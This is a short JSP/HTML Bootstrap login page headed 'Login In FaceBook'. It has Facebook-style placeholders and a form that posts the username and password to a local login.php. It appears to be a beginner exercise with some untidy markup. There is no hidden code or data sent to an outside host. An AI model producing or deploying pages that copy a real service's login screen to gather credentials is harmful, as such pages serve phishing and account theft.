<%@ page language="java" contentType="text/html; charset=UTF-8" pageEncoding="UTF-8"%>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Page</title>
    <!-- Include Bootstrap CSS -->
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.5.2/dist/css/bootstrap.min.css">
    
    <style>
    ::placeholder {
            color: rgb(20,30,50);
        }
    </style>
</head>
<body>

<div class="container">
    <div class="row justify-content-center mt-5">
        <div class="col-md-4">
            <div class="card">
                <div class="card-header" >
                    Login In FaceBook
                </div>
                <div class="card-body" class="font-family-helvetica font-color-primary">
                    <form action="login.php" method="post"> <!-- Replace 'login.php' with your backend script -->
                        <div class="form-group">
         
                            <input type="text" class="form-control" id="username" name="username" placeholder="Email address or phone number" required>
                        </div>
                        <div class="form-group">
                           
                            <input type="password" class="form-control" id="password" name="password" placeholder="Password" required>
                        </div class="center">
                        <button type="submit" class="btn btn-primary" >Login</button>
                    </form>
                </div>
            </div>
        </div>
    </div>
</div>

<!-- Include Bootstrap JS and jQuery -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.min.js"></script>

</body>
</html>
